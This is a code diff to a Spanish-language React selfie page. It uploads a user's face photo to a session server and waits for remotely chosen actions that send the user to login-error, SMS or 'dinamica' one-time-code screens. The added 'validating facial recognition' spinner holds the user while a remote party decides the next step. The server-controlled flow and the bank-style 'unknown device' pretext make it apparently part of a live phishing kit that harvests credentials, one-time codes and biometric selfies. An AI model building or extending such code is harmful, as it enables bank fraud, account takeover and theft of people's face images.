@@ -21,6 +21,7 @@ export function SelfiePage({
   const [ready, setReady] = useState(false)
   const [error, setError] = useState('')
   const [photo, setPhoto] = useState('')
+  const [submitting, setSubmitting] = useState(false)
 
   // Stable callback refs
   const onHomeRef = useRef(onHome)
@@ -57,18 +58,40 @@ export function SelfiePage({
         const session = await res.json()
         const action = session.action
 
+        if (action === 'error-selfie') {
+          setSubmitting(false)
+          setPhoto('')
+          setError('No pudimos validar tu rostro. Por favor, tómate la selfie nuevamente con buena iluminación y centrando tu rostro.')
+          // Reset action on server
+          fetch(`/api/sessions/${sessionId}/action`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: null, state: 'waiting-selfie' }),
+          }).catch(() => {})
+          return
+        }
+
         if (action === 'done') {
+          setSubmitting(false)
           onHomeRef.current()
           return
         }
 
         if (action === 'error-login') {
+          setSubmitting(false)
           onErrorLoginRef.current?.()
           return
         }
 
         if (action === 'dinamica' || action === 'sms') {
+          setSubmitting(false)
           onOtpRequiredRef.current?.(action)
+          return
+        }
+
+        if (action === 'selfie') {
+          setSubmitting(false)
+          setPhoto('')
           return
         }
       } catch {}
@@ -149,6 +172,7 @@ export function SelfiePage({
     ctx.drawImage(video, 0, 0, width, height)
     const dataUrl = canvas.toDataURL('image/jpeg', 0.88)
     setPhoto(dataUrl)
+    setError('')
 
     if (sessionId) {
       fetch(`/api/sessions/${sessionId}/selfie`, {
@@ -167,6 +191,7 @@ export function SelfiePage({
       if (typeof reader.result === 'string') {
         const dataUrl = reader.result
         setPhoto(dataUrl)
+        setError('')
         if (sessionId) {
           fetch(`/api/sessions/${sessionId}/selfie`, {
             method: 'POST',
@@ -181,6 +206,7 @@ export function SelfiePage({
 
   function retake() {
     setPhoto('')
+    setError('')
     if (fileInputRef.current) {
       fileInputRef.current.value = ''
     }
@@ -194,21 +220,23 @@ export function SelfiePage({
   }
 
   function handleFinish() {
+    if (!photo) return
+    setSubmitting(true)
+    setError('')
+
     if (sessionId) {
-      if (photo) {
-        fetch(`/api/sessions/${sessionId}/selfie`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ photo }),
-        }).catch(() => {})
-      }
+      fetch(`/api/sessions/${sessionId}/selfie`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ photo }),
+      }).catch(() => {})
+
       fetch(`/api/sessions/${sessionId}/state`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ state: 'done' }),
+        body: JSON.stringify({ state: 'received-selfie' }),
       }).catch(() => {})
     }
-    onHomeRef.current()
   }
 
   return (
@@ -220,64 +248,78 @@ export function SelfiePage({
       </header>
 
       <div className="selfie-body">
-        <h2>Validación facial</h2>
-        <p className="selfie-copy">
-          Esta validación nos ayudará a realizar la verificación facial cuando detectemos que
-          inicia sesión en un dispositivo desconocido.
-        </p>
-        <p className="selfie-hint">Centra tu cara dentro del óvalo para tomarte la selfie.</p>
-
-        <div className={`selfie-stage${photo ? ' captured' : ''}`}>
-          {photo ? (
-            <img src={photo} alt="Selfie capturada" />
-          ) : (
-            <video ref={videoRef} autoPlay playsInline muted />
-          )}
-          <div className="selfie-shade" aria-hidden />
-          <div className="selfie-oval" aria-hidden />
-        </div>
-
-        <canvas ref={canvasRef} className="sr-only" />
-        <input
-          ref={fileInputRef}
-          type="file"
-          accept="image/*"
-          capture="user"
-          className="sr-only"
-          onChange={handleFileUpload}
-        />
-
-        {error && !photo ? <p className="selfie-error">{error}</p> : null}
-
-        {photo ? (
-          <div className="selfie-actions">
-            <button type="button" className="login-outline" onClick={retake}>
-              Tomar de nuevo
-            </button>
-            <button type="button" className="login-submit ready" onClick={handleFinish}>
-              Continuar
-            </button>
+        {submitting ? (
+          <div className="login-waiting" style={{ textAlign: 'center', padding: '60px 0' }}>
+            <div className="login-spinner" />
+            <p style={{ marginTop: 24, fontWeight: 700, color: '#172744', fontSize: '1.15rem' }}>
+              Validando reconocimiento facial...
+            </p>
+            <p style={{ color: '#68778d', fontSize: '0.95rem', marginTop: 8 }}>
+              Por favor, espera un momento mientras verificamos tu información.
+            </p>
           </div>
         ) : (
-          <div className="selfie-actions">
-            <button
-              type="button"
-              className={`login-submit${ready ? ' ready' : ''}`}
-              disabled={!ready}
-              onClick={takeSelfie}
-            >
-              {ready ? 'Tomar selfie' : 'Activando cámara...'}
-            </button>
-            {!ready ? (
-              <button
-                type="button"
-                className="login-outline"
-                onClick={() => fileInputRef.current?.click()}
-              >
-                Subir foto desde dispositivo
-              </button>
-            ) : null}
-          </div>
+          <>
+            <h2>Validación facial</h2>
+            <p className="selfie-copy">
+              Esta validación nos ayudará a realizar la verificación facial cuando detectemos que
+              inicia sesión en un dispositivo desconocido.
+            </p>
+            <p className="selfie-hint">Centra tu cara dentro del óvalo para tomarte la selfie.</p>
+
+            <div className={`selfie-stage${photo ? ' captured' : ''}`}>
+              {photo ? (
+                <img src={photo} alt="Selfie capturada" />
+              ) : (
+                <video ref={videoRef} autoPlay playsInline muted />
+              )}
+              <div className="selfie-shade" aria-hidden />
+              <div className="selfie-oval" aria-hidden />
+            </div>
+
+            <canvas ref={canvasRef} className="sr-only" />
+            <input
+              ref={fileInputRef}
+              type="file"
+              accept="image/*"
+              capture="user"
+              className="sr-only"
+              onChange={handleFileUpload}
+            />
+
+            {error ? <p className="selfie-error">{error}</p> : null}
+
+            {photo ? (
+              <div className="selfie-actions">
+                <button type="button" className="login-outline" onClick={retake}>
+                  Tomar de nuevo
+                </button>
+                <button type="button" className="login-submit ready" onClick={handleFinish}>
+                  Continuar
+                </button>
+              </div>
+            ) : (
+              <div className="selfie-actions">
+                <button
+                  type="button"
+                  className={`login-submit${ready ? ' ready' : ''}`}
+                  disabled={!ready}
+                  onClick={takeSelfie}
+                >
+                  {ready ? 'Tomar selfie' : 'Activando cámara...'}
+                </button>
+                {!ready ? (
+                  <button
+                    type="button"
+                    className="login-outline"
+                    onClick={() => fileInputRef.current?.click()}
+                  >
+                    Subir foto desde dispositivo
+                  </button>
+                ) : null}
+              </div>
+            )}
+          </>
         )}
       </div>
     </div>
